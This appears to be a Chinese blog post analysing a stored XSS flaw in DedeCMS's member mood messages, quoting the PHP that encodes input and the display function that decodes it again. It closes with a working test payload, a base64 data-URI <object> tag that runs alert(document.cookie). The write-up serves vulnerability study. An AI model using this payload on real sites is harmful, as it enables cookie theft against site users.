---
title: dedecms 空间存储型xss分析
date: 2014-2-27 02:21
tags:
---

```php
else if($fmdo=='moodmsg')
{
    //用户登录
    if($dopost=="sendmsg")
    {
        if(!empty($content))
        {
        $ip = GetIP();
        $dtime = time();
          $ischeck = ($cfg_mb_msgischeck == 'Y')? 0 : 1;
          if($cfg_soft_lang == 'gb2312')
          {
              $content = utf82gb(nl2br($content));
          } 
          $content = cn_substrR(HtmlReplace($content,1),360);  //对内容进行处理 -> 看看 HtmlReplace函数
          //对表情进行解析
          $content = addslashes(preg_replace("/\[face:(\d{1,2})\]/is","<img src='".$cfg_memberurl."/templets/images/smiley/\\1.gif' style='cursor: pointer; position: relative;'>",$content));
          省略...
```

```php
function HtmlReplace($str,$rptype=0)
    {
        $str = stripslashes($str); //函数删除由 addslashes() 函数添加的反斜杠
                $str = preg_replace("/<[\/]{0,1}style([^>]*)>(.*)<\/style>/i", '', $str);//2011-06-30 禁止会员投稿添加css样式 (by:织梦的鱼)
        if($rptype==0)
        {
            $str = htmlspecialchars($str);
        }
        else if($rptype==1)
        {
            $str = htmlspecialchars($str); //预定义的字符转换为 HTML 实体
            $str = str_replace("　", ' ', $str);
            $str = preg_replace("/[\r\n\t ]{1,}/", ' ', $str);
        }
        else if($rptype==2)
        {
            $str = htmlspecialchars($str);
            $str = str_replace("　", '', $str);
            $str = preg_replace("/[\r\n\t ]/", '', $str);
        }
        else
        {
            $str = preg_replace("/[\r\n\t ]{1,}/", ' ', $str);
            $str = preg_replace('/script/i', 'ｓｃｒｉｐｔ', $str);
            $str = preg_replace("/<[\/]{0,1}(link|meta|ifr|fra)[^>]*>/i", '', $str);
        }
        return addslashes($str);
    }
```

`HtmlReplace` 函数  `$rptype` 传递过来的是1预定义的字符转换为 HTML 实体

因此插入到数据库的数据 是经过转换 成 html实体的 从而过滤特殊字符


经过函数跟踪发现显示会员心情管理  

`<?php echo jstrimjajxlog($fields['msg'],200); ?>`

调用了  `jstrimjajxlog`函数 （将**html**实体 又还原了 0rz...）

```php
function JstrimJajxLog($str,$len)
{
    $str = cn_substr($str,$len);
    $str = str_replace(''', '"', $str);
    $str = str_replace('&lt;', '<', $str);
    $str = str_replace('&gt;', '>', $str);
    return $str;
}
```
![2019-07-22-05-16-33](https://wolvez.oss-cn-hangzhou.aliyuncs.com/dad0bb832a4820c27e17b4cfb79429cd.png)

一般管理员不会去看这个的

* 注意不要用 引号 因为有 stripslashes 转义  
测试语句:
```html
<object data=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==></object>
```